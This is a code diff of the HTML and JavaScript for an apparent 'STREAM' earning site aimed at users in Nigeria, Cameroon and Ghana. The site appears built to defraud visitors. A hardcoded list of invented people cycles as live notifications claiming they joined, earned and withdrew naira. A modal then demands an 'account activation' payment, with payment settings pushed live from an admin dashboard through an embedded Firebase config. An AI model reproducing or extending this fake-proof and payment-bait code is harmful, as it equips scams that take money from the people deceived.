@@ -267,7 +267,6 @@
 </head>
 <body>
 
-<!-- Side Menu -->
 <div id="side-menu" class="side-menu">
     <div style="margin-bottom: 40px;">
         <img src="logo.png" alt="Logo" class="logo-img">
@@ -284,7 +283,6 @@
     </button>
 </div>
 
-<!-- Live Notifications -->
 <div id="notif-popup" class="notif-popup">
     <div class="notif-icon" id="notif-icon"><i class="fas fa-circle-check"></i></div>
     <div class="notif-body" id="notif-text">
@@ -303,7 +301,6 @@
     </div>
 </div>
 
-<!-- Account Status -->
 <div class="glass-card">
     <div class="flex justify-between items-start mb-6">
         <div class="flex items-center gap-3">
@@ -320,7 +317,6 @@
     </div>
 </div>
 
-<!-- Onboarding Details -->
 <div class="glass-card">
     <div class="flex items-center gap-3 mb-6">
         <i class="fas fa-file-invoice-dollar text-xl" style="color:var(--stream-green)"></i>
@@ -351,7 +347,6 @@
     </div>
 </div>
 
-<!-- Features Section -->
 <div style="margin: 30px 20px 15px; font-size: 18px; font-weight: 900; display: flex; align-items: center; gap: 10px; text-transform: uppercase; color: #ffffff;">
     <i class="fas fa-grip-vertical" style="color:var(--stream-green)"></i> Stream Features
 </div>
@@ -386,7 +381,6 @@
     </div>
 </div>
 
-<!-- Recent Activity -->
 <div class="glass-card-bright mt-10">
     <div style="font-size: 18px; font-weight: 800; margin-bottom: 25px; color: #ffffff;">Account History</div>
     <div class="space-y-6">
@@ -409,57 +403,86 @@
     </div>
 </div>
 
-<!-- Activation Modal (Updated to match image) -->
 <div id="activation-modal" class="modal-overlay">
     <div class="modal-card">
-        <!-- Close Button -->
         <div onclick="closeModal()" style="position: absolute; top: 20px; right: 20px; color: rgba(255,255,255,0.5); font-size: 24px; cursor: pointer;">
             <i class="fas fa-times"></i>
         </div>
-        
-        <!-- Warning Icon (Yellow) -->
         <div style="color:#ffcc00; font-size: 70px; margin-bottom: 25px;">
             <i class="fas fa-triangle-exclamation"></i>
         </div>
-
-        <!-- Title -->
         <h2 style="font-size: 26px; font-weight: 900; margin-bottom: 15px; color:#ffffff; line-height: 1.2;">
             Complete Account<br>Activation
         </h2>
-
-        <!-- Description -->
         <p style="color:rgba(255,255,255,0.6); font-size: 16px; line-height: 1.5; margin-bottom: 30px; padding: 0 10px;">
             You're almost there! Complete your account activation by making the payment for your selected plan.
         </p>
-
-        <!-- Form Label -->
         <div style="text-align: left; font-size: 11px; font-weight: 800; color: rgba(255,255,255,0.4); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 5px; padding-left: 5px;">
             Confirm your country
         </div>
-
-        <!-- Country Select -->
         <select id="country-select" class="country-select">
             <option value="nigeria">Nigeria 🇳🇬</option>
             <option value="cameroon">Cameroon 🇨🇲</option>
             <option value="ghana">Ghana 🇬🇭</option>
-            <option value="kenya">Kenya 🇰🇪</option>
-            <option value="south_africa">South Africa 🇿🇦</option>
-            <option value="uganda">Uganda 🇺🇬</option>
         </select>
-
-        <!-- Proceed Button -->
         <div class="btn-proceed" onclick="goToRegistration()">
             Proceed to payment <i class="fas fa-credit-card"></i>
         </div>
     </div>
 </div>
 
-<!-- Menu Toggle Button -->
 <div class="menu-toggle" onclick="toggleMenu()">
     <i class="fas fa-bars"></i>
 </div>
 
-<script>
+<script type="module">
+    // NEW FIREBASE CONFIGURATION
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+    import { getFirestore, doc, onSnapshot } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyBnYhUrJq0ZQNn4wlQ80Ug9oYXDX71rNsE",
+      authDomain: "celeste-official.firebaseapp.com",
+      projectId: "celeste-official",
+      storageBucket: "celeste-official.firebasestorage.app",
+      messagingSenderId: "955219718575",
+      appId: "1:955219718575:web:0aa8d59d18f23d8dcdbf5a",
+      measurementId: "G-7VKF6NVWCD"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    // Live sync with Admin Dashboard
+    // This ensures that when admin updates, it reflects here INSTANTLY without refresh
+    onSnapshot(doc(db, "configs", "main"), (snap) => {
+        if (snap.exists()) {
+            const data = snap.data();
+            // Store live data in localStorage for the payment page to use
+            localStorage.setItem('stream_config', JSON.stringify(data));
+            console.log("Config Updated from Admin Dashboard");
+        }
+    });
+
+    // Global toggle function
+    window.toggleMenu = () => {
+        document.getElementById('side-menu').classList.toggle('open');
+    };
+
+    window.openModal = () => {
+        document.getElementById('activation-modal').style.display = 'flex';
+    };
+
+    window.closeModal = () => {
+        document.getElementById('activation-modal').style.display = 'none';
+    };
+
+    window.goToRegistration = () => {
+        const country = document.getElementById('country-select').value;
+        localStorage.setItem('selected_country', country);
+        window.location.href = 'payment.html'; 
+    };
+
     const ACTIVITIES = [
         { type: 'joined', name: "Ayo M.", loc: "Lagos", amount: "12,000", time: "Just now", icon: "fa-user-plus" },
         { type: 'withdrawn', name: "Olamide B.", loc: "Ibadan", amount: "42,000", time: "2m ago", icon: "fa-money-bill-transfer" },
@@ -468,47 +491,23 @@
     ];
 
     let currentActIndex = 0;
-
     function cycleActivities() {
-        const popup = document.getElementById('notif-popup');
+      const popup = document.getElementById('notif-popup');
         const iconDiv = document.getElementById('notif-icon');
         const textDiv = document.getElementById('notif-text');
-        const act = ACTIVITIES[currentActIndex];
-
         if(!popup) return;
-
+        const act = ACTIVITIES[currentActIndex];
         iconDiv.innerHTML = `<i class="fas ${act.icon}"></i>`;
         let message = act.type === 'joined' 
             ? `<span class="notif-user">${act.name}</span> (${act.loc}) joined <span style="font-weight:800; color:var(--stream-green)">STREAM</span> and earned <span class="notif-amount">₦${act.amount}</span>`
             : `<span class="notif-user">${act.name}</span> (${act.loc}) withdrew <span class="notif-amount withdrawal">₦${act.amount}</span> from <span style="font-weight:800; color:var(--stream-green)">STREAM</span>`;
-
         textDiv.innerHTML = `${message}<div style="font-size:10px; color:rgba(255,255,255,0.4); margin-top:2px;">${act.time}</div>`;
         popup.classList.add('active');
-        
         setTimeout(() => {
             popup.classList.remove('active');
             currentActIndex = (currentActIndex + 1) % ACTIVITIES.length;
             setTimeout(cycleActivities, 4000);
         }, 6000);
-    }
-
-    function toggleMenu() {
-        document.getElementById('side-menu').classList.toggle('open');
-    }
-
-    function openModal() {
-        document.getElementById('activation-modal').style.display = 'flex';
-    }
-
-    function closeModal() {
-        document.getElementById('activation-modal').style.display = 'none';
-    }
-
-    function goToRegistration() {
-        const country = document.getElementById('country-select').value;
-        localStorage.setItem('selected_country', country);
-        // FIXED: Redirects to payment.html
-        window.location.href = 'payment.html'; 
     }
 
     function initUserTracking() {
